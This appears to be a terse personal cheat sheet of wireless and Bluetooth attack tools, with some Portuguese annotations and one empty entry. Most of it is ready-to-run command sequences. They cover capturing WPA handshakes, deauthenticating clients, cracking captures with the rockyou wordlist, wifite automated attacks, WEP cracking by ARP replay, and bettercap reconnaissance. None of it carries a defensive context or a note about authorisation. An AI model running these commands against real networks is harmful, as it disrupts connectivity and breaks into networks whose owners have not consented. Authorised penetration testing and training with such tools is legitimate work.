 Wireless Security Tools

# WiFi Reconnaissance

 Aircrack-ng Suite
- aircrack-ng: WEP/WPA cracking


 Bluetooth Security

 Bluez Tools
- hcitool: Bluetooth device scanning
- bluetoothctl: Bluetooth management
- l2ping: Bluetooth ping

 Bettercap
- 

Wireshark
- Packet Analysis: Análise de pacotes

# Scripts Úteis

 Aircrack-ng workflow
 1. Ativar monitor mode
airmon-ng start wlan0

 2. Descobrir redes
airodump-ng wlan0mon

 3. Capturar handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

 4. Deauth attack (noutra terminal)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

 5. Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

 Wifite automated attack
wifite --wpa --dict /usr/share/wordlists/rockyou.txt

 WEP cracking
 1. Capture packets
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon

 2. ARP replay attack
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC wlan0mon

 3. Crack WEP
aircrack-ng wep-01.cap

 Bluetooth scanning
hcitool scan
bluetoothctl
scan on
pair MAC_ADDRESS

 Bettercap
bettercap -iface wlan0mon
wifi.recon on
wifi.show